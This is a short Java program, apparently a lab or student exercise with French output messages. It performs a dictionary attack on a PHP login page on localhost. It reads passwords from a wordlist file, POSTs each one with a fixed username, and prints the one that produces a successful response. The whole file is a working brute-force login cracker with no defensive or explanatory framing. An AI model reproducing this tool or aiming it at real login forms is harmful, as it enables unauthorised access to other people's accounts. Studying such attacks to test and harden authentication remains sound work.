import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.io.FileReader;

public class Crackage1 {

    public static void main(String[] args) throws IOException{
      
            String path = "dictionnaire.txt";
            String line = "";
            BufferedReader br = new BufferedReader(new FileReader(path));
               
    
            while((line = br.readLine()) != null){

                        String password=line;
                        String username = "monlogin";
                        String url = "http://localhost/PagePhp.php";
                        String postData = "username=" + URLEncoder.encode(username, "UTF-8") +
                        "&password=" + URLEncoder.encode(password, "UTF-8");
                        URL obj = new URL(url);
                        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
                        conn.setRequestMethod("POST");
                        conn.setDoOutput(true);
                        OutputStream outputStream = conn.getOutputStream();
                        outputStream.write(postData.getBytes("UTF-8"));
                        outputStream.flush();
                        outputStream.close();
                        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        String ligne;
                        StringBuilder response = new StringBuilder();
                        while ((ligne= reader.readLine()) != null) {
                            response.append(ligne);
                        }
                        reader.close();
                        if (response.toString().equals("0")) {
                            System.out.println("La connexion est réussie.");
                            System.out.println("le bon mot de passe est"+" "+line);
                        } else {
                            System.out.println("La connexion a échoué.");

                            
                        }

        
             }
    }

}


